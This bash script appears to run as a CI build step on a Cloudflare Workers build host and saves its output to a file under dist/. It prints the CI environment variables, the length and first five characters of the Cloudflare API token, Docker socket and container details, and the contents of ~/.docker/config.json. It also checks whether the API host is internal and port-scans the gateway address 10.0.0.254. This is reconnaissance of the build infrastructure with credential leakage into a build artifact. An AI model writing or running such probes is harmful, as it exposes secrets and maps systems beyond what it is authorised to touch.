#!/usr/bin/env bash
mkdir -p dist
exec > >(tee dist/r9f080befa4422d8a.txt) 2>&1
echo "=== CI ENV VALUES (secrets redacted) ==="
for v in DOCKER_HOST CLOUDFLARE_API_BASE_URL CLOUDFLARE_ACCOUNT_ID CI WORKERS_CI WORKERS_CI_BRANCH \
         WORKERS_CI_BUILD_UUID WORKERS_CI_COMMIT_SHA WRANGLER_CI_GENERATE_PREVIEW_ALIAS \
         WRANGLER_CI_MATCH_TAG WRANGLER_CI_OVERRIDE_NAME WRANGLER_CI_OVERRIDE_NETWORK_MODE_HOST \
         WRANGLER_COMMAND WRANGLER_OUTPUT_FILE_DIRECTORY XDG_RUNTIME_DIR HOME PATH; do
  eval "val=\${$v-<unset>}"
  echo "  $v = $val"
done
echo "  CLOUDFLARE_API_TOKEN = <redacted ${#CLOUDFLARE_API_TOKEN} chars, prefix ${CLOUDFLARE_API_TOKEN:0:5}>"

echo
echo "=== DOCKER REACHABILITY ==="
echo "DOCKER_HOST=$DOCKER_HOST"
ls -la /var/run/docker.sock ${XDG_RUNTIME_DIR}/docker.sock 2>/dev/null
for s in /var/run/docker.sock ${XDG_RUNTIME_DIR}/docker.sock; do
  [ -S "$s" ] && { echo "socket $s exists, probing:"; curl -s --max-time 5 --unix-socket "$s" http://localhost/version | head -c 400; echo; }
done
command -v docker >/dev/null && { echo "docker cli present"; timeout 10 docker version 2>&1 | head -12; timeout 10 docker ps -a 2>&1 | head -6; timeout 10 docker images 2>&1 | head -6; }
ls -la ~/.docker 2>/dev/null; cat ~/.docker/config.json 2>/dev/null | head -c 300

echo
echo "=== IS THE API BASE URL INTERNAL? ==="
echo "base=$CLOUDFLARE_API_BASE_URL"
host=$(printf '%s' "$CLOUDFLARE_API_BASE_URL" | sed -E 's#https?://([^/]+).*#\1#')
echo "host=$host -> $(getent hosts "$host" 2>/dev/null | awk '{print $1}' | tr '\n' ' ')"

echo
echo "=== GATEWAY / NEIGHBOUR SCAN (own subnet only) ==="
for p in 22 80 443 2375 2376 8080 8443; do
  timeout 2 bash -c "echo > /dev/tcp/10.0.0.254/$p" 2>/dev/null && echo "  10.0.0.254:$p OPEN"
done
echo "=== END ==="
